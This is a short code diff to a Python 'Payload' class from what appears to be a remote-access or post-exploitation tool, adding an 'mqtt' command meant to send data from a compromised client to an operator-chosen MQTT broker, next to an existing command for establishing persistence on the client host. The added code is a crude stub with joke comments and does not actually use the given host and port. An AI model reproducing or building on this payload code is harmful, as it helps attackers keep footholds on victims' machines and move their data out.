@@ -945,7 +945,23 @@ class Payload():
             log(result)
             return result
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
+    @config(platforms=['win32', 'linux2', 'darwin'], command=True, usage='mqtt <host> <port>')
+    def mqtt(self, args):
+        """
+        Post relevant data to an MQTT broker
+        Or up my butt.
+        """
+        try:
+            if 'mqtt' not in globals():
+                self.load('mqtt')
+            run_this = globals()['mqtt'].run()
+            return 'Shit just got run'
+        except Exception as e:
+            result = "something is messed up with MQTT. Not sure what yet, but we got to payload exception."
+            log(result)
+            return result
+    
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')        
     def persistence(self, args=None):
         """
         Establish persistence on client host machine
